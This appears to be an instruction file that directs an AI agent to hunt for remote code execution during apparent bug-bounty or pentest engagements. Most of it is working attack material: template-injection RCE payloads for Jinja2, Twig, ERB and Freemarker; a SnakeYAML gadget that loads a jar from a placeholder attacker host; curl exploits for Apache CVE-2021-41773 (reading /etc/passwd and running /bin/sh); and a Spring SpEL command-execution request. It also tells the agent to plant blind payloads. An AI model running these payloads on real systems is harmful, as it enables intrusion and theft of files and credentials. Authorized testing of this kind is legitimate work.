---
name: hunt-rce
description: RCE hunting - template injection, YAML/XML deserialization, dependency confusion, Kubernetes surfaces, CVE-specific exploits (Apache CVE-2021-41773, Spring CVE-2022-22963). OOB-mandatory for blind cases. Wiki-first, FIND schema output.
---

# Hunt: Remote Code Execution

## Pre-Attack: Wiki Query (MANDATORY)
```
qmd_query "RCE remote code execution template injection" via wiki-search MCP -> read matching technique page if found.
```
Apply known CVEs and template injection payloads already documented.


**Self-heal:** If the wiki query returns nothing, create a stub `wiki/techniques/<area>/<slug>.md` (frontmatter + a `## Observed during <engagement>` section built from your findings) before proceeding, so the gap fills instead of silently recurring.

## Scope Check
- Confirm target is in scope
- Read Deadends.md - skip already-tested execution surfaces

## Attack Surface Signals
URL patterns: `/management-console/*`, `/admin/settings/*`, `/webhook/*`, `/render?template=`, `/import?url=`

Tech stack signals:
| Signal | RCE Vector |
|--------|-----------|
| Nomad config UI editable | Go text/template injection |
| SnakeYAML in classpath | `!!javax.script.ScriptEngineManager` |
| ingress-nginx annotations | Path field regex bypass |
| Spring Boot `*-routing-expression` header | SpEL injection |
| `X-GitHub-Enterprise-Version` | Nomad/collectd/syslog-ng config injection |

## Methodology
1. Map execution contexts: template engines, shell commands, YAML parsers, file paths, package resolution
2. Enumerate admin/management interfaces: `/management-console`, `/admin`, `/_internal`, `/setup`
3. Template injection probe in every config/free-text field:
```
{{7*7}}${7*7}#{7*7}<%= 7*7 %>*{7*7}
```
Look for `49` in response, logs, or OOB DNS callbacks.

4. YAML deserialization:
```yaml
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[!!java.net.URL ["http://YOUR_COLLAB/exploit.jar"]]]
]
```

5. Apache CVE-2021-41773/42013 (Apache 2.4.49/2.4.50):
```bash
# File read
curl --path-as-is "http://target/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"
# RCE (cgi-bin alias required)
curl --path-as-is -X POST \
  -d "echo Content-Type: text/plain; echo; id" \
  "http://target/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
```

6. Spring Cloud Function SpEL (CVE-2022-22963):
```bash
curl -X POST http://target:8080/functionRouter \
  -H "Content-Type: text/plain" \
  -H 'spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(new String[]{"id"})' \
  --data "x"
```

7. Verify all RCE with OOB callback before claiming: use interactsh DNS token. When you plant a blind/OOB RCE payload, append a row to `targets/<eng>/oob.md`: `| <token> | <sink url+param> | rce | <date> | waiting | |` (columns: token | sink | class | planted | status | source, where token = your unique interactsh label). The recon-capture hook auto-correlates incoming callbacks to flip the row to HIT and SessionStart surfaces HITs; a HIT row is the confirmation gate to scaffold the FIND. Do NOT claim a blind RCE without a HIT row.
8. Chain: low-severity misconfig (CSRF, traversal) + RCE primitive = critical
9. **Distill to wiki (when confirmed):** if the finding is a reusable template bypass or a new CVE, stage a GENERIC wiki candidate now (no client host): `python3 scripts/wiki-stage.py --kind technique --slug <slug> --target-page techniques/web/os-command-injection.md`. Promote later via `scripts/wiki-promote.py`.

## Template Injection RCE Payloads
```python
# Jinja2
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# ERB (Ruby)
<%= `id` %>

# Freemarker
<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
```

## FIND Output

If RCE confirmed (command output returned or OOB callback received):
```
Create Vulns/Research/FIND-XXX-CRITICAL-rce-<host>.md
Add row to Vuln-index.md: CRITICAL section
```

If template injection confirmed but sandboxed (no RCE):
```
Create Vulns/Research/FIND-XXX-HIGH-ssti-<host>.md
Severity HIGH if reflected in output; MEDIUM if sandboxed
```

If path exhausted:
```
Append to Deadends.md: - [ ] RCE/template injection on <host> -- probes returned literal {{7*7}}, no eval
```

Report: Status + files created.
